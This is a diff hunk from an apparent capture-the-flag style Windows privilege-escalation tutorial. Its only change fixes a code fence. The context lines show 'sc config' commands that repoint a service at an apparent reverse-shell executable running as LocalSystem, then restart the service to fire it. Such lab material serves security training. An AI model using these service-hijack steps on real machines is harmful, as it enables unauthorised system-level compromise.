@@ -2002,7 +2002,7 @@ C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= Local
 Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
 
 example:
-``´
+```
 C:\> sc stop THMService
 C:\> sc start THMService
 ```
